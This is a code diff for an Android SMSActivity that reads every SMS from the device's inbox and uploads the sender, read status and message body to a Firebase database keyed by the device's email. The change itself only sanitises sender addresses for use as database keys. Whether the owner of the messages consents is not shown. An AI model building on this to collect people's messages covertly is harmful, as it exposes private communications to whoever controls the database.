@@ -22,6 +22,8 @@ import com.google.firebase.database.FirebaseDatabase;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 public class SMSActivity extends AppCompatActivity {
 
@@ -79,10 +81,18 @@ public class SMSActivity extends AppCompatActivity {
                         + "\nTYPE:" + cursor.getColumnIndexOrThrow("type")
                         + "\nReadStatus:" + readStatus);
 
+                String senderAddress = cursor.getString(cursor.getColumnIndexOrThrow("address"));
+                Pattern pt = Pattern.compile("[^a-zA-Z0-9]");
+                Matcher match = pt.matcher(senderAddress);
+                while (match.find()) {
+                    String s = match.group();
+                    senderAddress = senderAddress.replaceAll("\\" + s, "");
+                }
+
                 mFirebaseDatabase.child("sms").child("" + MyDevice.getDeviceEmailName(SMSActivity.this)
 //                                MyDevice.getDeviceName()
                         /*+"(" + MyDevice.getDeviceOsVersion() + ")"*/)
-                        .child(cursor.getString(cursor.getColumnIndexOrThrow("address")))
+                        .child(senderAddress)
                         .child(readStatus)
                         .child("" + i)
                         .setValue("" + cursor.getString(cursor.getColumnIndexOrThrow("body"))
